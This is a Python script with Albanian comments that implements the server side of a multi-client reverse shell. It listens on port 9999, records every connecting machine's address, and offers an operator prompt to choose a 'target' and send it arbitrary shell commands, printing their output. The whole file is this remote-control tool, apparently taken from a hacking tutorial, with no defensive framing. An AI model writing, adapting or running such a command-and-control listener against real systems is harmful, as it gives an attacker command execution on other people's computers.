import socket
import threading
import time
import sys
from queue import Queue

NUMRI_FIJEVE = 2
NUMRI_LIDHJEVE = [1, 2]
queue = Queue()
gjithe_lidhjet = []
gjithe_adresat = []


# Krijo Corape ( lejon dy llogaritesa te lidhen )

def krijo_corape():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Corapja nuk u krijua: " + str(msg))


# lidh corapen me portin dhe prit per lidhjen e klientit

def lidh_corape():
    try:
        global host
        global port
        global s
        print("Duke lidhur corapen me portin: " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Corapja nuk u lidh dot" + str(msg)+ "\n" + "Retrying...")
        lidh_corape()

# Prano lidhje me shume kliente dhe regjistroji ne gjithe_lidhjet

def prano_lidhje():
    for c in gjithe_lidhjet:
        c.close()
    del gjithe_lidhjet[:]
    del gjithe_adresat[:]
    while 1:
        try:
            conn, address = s.accept()
            conn.setblocking(1) #no timeout
            gjithe_lidhjet.append(conn)
            gjithe_adresat.append(address)
            print(" \n Lidhja u krye! IP: " + address[0] )
        except:
            print("\n Gabim ne lidhje!")

# program per te derguar komandat

def fillo_breshken():
    while 1:
        cmd = input('breshka> ')
        if cmd == 'mbyll':
            print("Programi u mbyll")
            s.socket.shutdown(2)
            s.socket.close()
            sys.exit()
        if cmd == 'listo':
            shfaq_lidhjet()
            continue
        if cmd == 'ndihme':
            ndihme()
        elif 'zgjidh' in cmd:
            conn = merr_shenjester(cmd)
            if conn is not None:
                dergo_komandat(conn)
        else:
            print("Komanda nuk njihet nga breshka")

def shfaq_lidhjet():
    rezultatet = ''
    for i, conn in enumerate(gjithe_lidhjet):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del gjithe_lidhjet[i]
            del gjithe_adresat[i]
            continue
        rezultatet += str(i) + '   ' + str(gjithe_adresat[i][0]) \
                      + ':' + str(gjithe_adresat[i][1]) + '\n'
    print('!====== Klientet =======! \n' + rezultatet)

#zgjidh kompjuterin
def merr_shenjester(cmd):
    try:
        shenjestra=cmd.replace('zgjidh ','')
        shenjestra=int(shenjestra)
        conn=gjithe_lidhjet[shenjestra]
        print("tashme je lidhur me: " + str(gjithe_adresat[shenjestra][0]))
        print("\n" + str(gjithe_adresat[shenjestra][0]) + '> ', end = "")
        return conn
    except:
        print("zgjedhje pa vlere")
        return None

def dergo_komandat(conn):
    while True:
        try:
            cmd=input()
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                pergjigje = str(conn.recv(20480), "utf-8")
                print(pergjigje, end="")
            if cmd == 'quit':
                break
        except:
            print("Lidhja u prish...  ")
            break

# krijo Fijet
def krijo_fijet():
    for _ in range(NUMRI_FIJEVE):
        f = threading.Thread(target = pune)
        f.daemon = True
        f.start()

#bej punen ne radhe( nje ben lidhjen , tjetra dergon komande)
def pune():
    while 1:
        x= queue.get()
        if x==1:
            krijo_corape()
            lidh_corape()
            prano_lidhje()
        if x==2:
            fillo_breshken()
        queue.task_done()


# cdo lidhje eshte nje pune e re
def krijo_pune():
    for x in NUMRI_LIDHJEVE:
        queue.put(x)
    queue.join()

def ndihme():
    print("-------------------------------------------------")
    print("-------------------------------------------------")
    print("listo\t-\t Liston te gjithe kompjuterat e lidhur")
    print("zgjidh\t-\t Zgjedh nje nga kompjuterat e lidhur")
    print("mbyll\t-\t Mbyll Programin dhe te gjitha lidhjet")
    print("ndihme\t-\t Shfaq kete ndihme ne ekran")
    print("-------------------------------------------------")
    print("-------------------------------------------------")


#funksioni kryesor
ndihme()
krijo_fijet()
krijo_pune()
